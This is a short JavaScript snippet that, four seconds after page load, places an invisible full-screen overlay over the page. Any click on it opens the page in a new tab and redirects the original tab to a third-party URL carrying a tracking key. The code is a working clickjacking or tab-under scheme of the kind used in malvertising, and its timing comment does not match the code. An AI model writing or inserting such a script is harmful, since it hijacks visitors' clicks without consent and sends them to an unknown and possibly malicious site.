// Create full screen popup dynamically
window.onload = function() {
    setTimeout(function() {
        // Create overlay div
        var popupOverlay = document.createElement("div");
        popupOverlay.id = "popupOverlay";

        // Style overlay inline
        popupOverlay.style.position = "fixed";
        popupOverlay.style.top = "0";
        popupOverlay.style.left = "0";
        popupOverlay.style.width = "100%";
        popupOverlay.style.height = "100%";
        popupOverlay.style.backgroundColor = "rgba(0,0,0,0.0)";
        popupOverlay.style.display = "flex";
        popupOverlay.style.justifyContent = "center";
        popupOverlay.style.alignItems = "center";
        popupOverlay.style.zIndex = "9999";
        popupOverlay.style.cursor = "pointer";

        // Create text div
        var popupText = document.createElement("div");
        popupText.innerText = "";
        
        // Style text inline
        popupText.style.color = "#fff";
        popupText.style.fontSize = "24px";
        popupText.style.textAlign = "center";
        popupText.style.fontFamily = "Arial, sans-serif";
        popupText.style.padding = "20px";

        // Append text to overlay
        popupOverlay.appendChild(popupText);

        // Append overlay to body
        document.body.appendChild(popupOverlay);

        // Click anywhere on overlay
        popupOverlay.onclick = function() {
            var currentURL = window.location.href; // current page URL

            // Open new tab (Tab2)
            var newTab = window.open(currentURL, "_blank");

            // Redirect Tab1 after Tab2 opens
            setTimeout(function() {
                window.location.href = "https://judicialimpatientgenerator.com/zcvm0rch?key=93b158ea491b4f11e0adbacd15934c67"; // Tab1 redirect URL
            }, 500);

            // hide overlay
            popupOverlay.style.display = "none";
        };
    }, 4000); // 1 second delay
};
